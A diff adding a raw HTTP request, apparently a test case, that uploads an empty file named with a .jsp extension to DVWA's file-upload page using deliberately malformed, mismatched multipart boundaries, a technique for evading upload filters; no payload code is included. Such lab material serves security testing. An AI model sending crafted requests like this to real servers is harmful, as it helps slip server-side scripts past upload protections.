@@ -1,0 +1,43 @@
+# 畸形上传文件
+POST /dvwa/vulnerabilities/upload/ HTTP/1.1
+Host: www.xwd_test.com
+Cookie: security=impossible; PHPSESSID=p4hppu5qgodugjfef4mmhdpvb2
+Content-Length: 547
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://www.byptest2.com
+Content-Type: multipart/form-data;boundary=----WebKitFormBoundarypC8AqcxOgUV9Erc=k
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://www.byptest2.com/dvwa/vulnerabilities/upload/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=0, i
+Connection: close
+
+------WebKitFormBoundarypC8AqcxOgUV9E1rc=k
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+------WebKitFormBoundarypC8AqcxOgUV9Erck
+Content-Disposition: form-data; name="uploaded"; filename="新建 文本文档.jsp"
+Content-Type: text/plain
+
+
+------WebKitFormBoundarypC8AqcxOgUV9Erc=k
+Content-Disposition: form-data; name="Upload"
+
+Upload
+------WebKitFormBoundarypC8AqcxOgUV9Erc=k
+Content-Disposition: form-data; name="user_token"
+
+7e1fe93455ba85ee8f03eca876ee3cc8
+------WebKitFormBoundarypC8AqcxOgUV9Erc=k--
+sad
